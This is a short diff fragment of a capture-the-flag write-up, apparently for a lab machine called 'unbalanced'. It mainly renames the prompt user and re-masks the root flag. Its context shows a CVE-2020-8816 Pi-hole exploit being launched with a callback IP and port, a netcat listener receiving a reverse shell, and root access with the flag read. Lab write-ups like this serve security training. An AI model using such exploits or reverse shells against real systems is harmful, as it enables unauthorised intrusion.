 └─$ python3 ./CVE-2020-8816.py http://127.0.0.1:1337 admin 10.10.15.88 12345                        2 ⨯
 Attempting to verify if Pi-hole version is vulnerable
 Logging in...
@@ -1319,7 +1320,7 @@ Sending payload
 the payload was away...
 
 ```text
-┌──(zweilos㉿kali)-[~]
+┌──(kac0㉿kali)-[~]
 └─$ nc -lvnp 12345       
 listening on [any] 12345 ...
 id  
@@ -1333,7 +1334,7 @@ and I got a shell...as `www-data`!?
 ### Getting a shell
 
 ```text
-┌──(zweilos㉿kali)-[~]
+┌──(kac0㉿kali)-[~]
 └─$ nc -lvnp 12345       
 listening on [any] 12345 ...
 id  
@@ -1455,5 +1456,5 @@ root@unbalanced:/home/bryan# id && hostname
 uid=0(root) gid=0(root) groups=0(root)
 unbalanced
 root@unbalanced:/home/bryan# cat /root/root.txt 
-1f44****82d7
+1f44************************82d7
 ```
